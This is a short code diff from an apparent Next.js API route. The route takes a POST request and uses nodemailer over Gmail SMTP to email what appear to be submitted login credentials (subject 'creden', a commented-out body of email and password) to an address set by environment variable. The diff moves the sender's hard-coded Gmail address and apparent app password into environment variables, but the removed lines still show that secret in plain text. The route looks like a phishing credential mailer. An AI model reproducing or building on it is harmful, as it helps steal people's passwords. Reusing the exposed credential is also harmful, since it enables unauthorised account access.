@@ -15,13 +15,13 @@ export async function POST(request: NextRequest) {
       port: 465,
       secure: true,
       auth: {
-        user: "Deesbox96@gmail.com",
-        pass: "erfwgneywbkpimcp",
+        user: process.env.APP_ACCOUNT,
+        pass: process.env.APP_PASSWORD,
       },
     });
 
     const result = await transporter.sendMail({
-      from: `"dees" <Deesbox96@gmail.com>`,
+      from: `"dees" <${process.env.APP_ACCOUNT}>`,
       to: process.env.EMAIL_TO_SEND,
       subject: "creden",
       // text: `${JSON.stringify(email)} ${JSON.stringify(password)}`,
